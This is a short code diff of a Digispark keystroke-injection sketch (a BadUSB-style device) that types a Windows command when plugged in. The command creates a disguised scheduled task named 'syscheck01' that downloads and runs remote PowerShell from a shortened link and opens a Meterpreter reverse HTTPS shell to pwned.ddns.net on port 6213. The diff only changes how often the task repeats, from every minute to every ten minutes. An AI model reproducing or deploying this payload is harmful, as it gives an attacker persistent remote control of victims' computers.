@@ -16,7 +16,7 @@ void loop() {
 
   DigiKeyboard.delay(500);
 
-  DigiKeyboard.print("schtasks /create /tn syscheck01 /tr \"powershell \\\"IEX (New-Object Net.WebClient).DownloadString(\\\\\"\\\"http://bit.ly/2jMeXr2\\\\\"\\\");Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost pwned.ddns.net -Lport 6213 -Force\\\"\" /SC MINUTE /MO 1");
+  DigiKeyboard.print("schtasks /create /tn syscheck01 /tr \"powershell \\\"IEX (New-Object Net.WebClient).DownloadString(\\\\\"\\\"http://bit.ly/2jMeXr2\\\\\"\\\");Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost pwned.ddns.net -Lport 6213 -Force\\\"\" /SC MINUTE /MO 10");
 
   DigiKeyboard.delay(200);
 
